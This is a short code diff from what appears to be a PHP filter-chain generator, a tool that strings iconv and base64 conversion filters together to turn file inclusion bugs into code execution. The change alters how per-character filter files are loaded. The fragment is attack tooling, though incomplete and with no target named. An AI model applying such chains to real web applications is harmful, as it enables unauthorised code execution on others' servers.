@@ -11,7 +11,7 @@ filters += "convert.iconv.UTF8.UTF7|"
 
 
 for c in base64_payload[::-1]:
-        filters += open('./res/'+c).read() + "|"
+        filters += open('./res/'+(str(hex(ord(c)))).replace("0x","")).read() + "|"
         # decode and reencode to get rid of everything that isn't valid base64
         filters += "convert.base64-decode|"
         filters += "convert.base64-encode|"
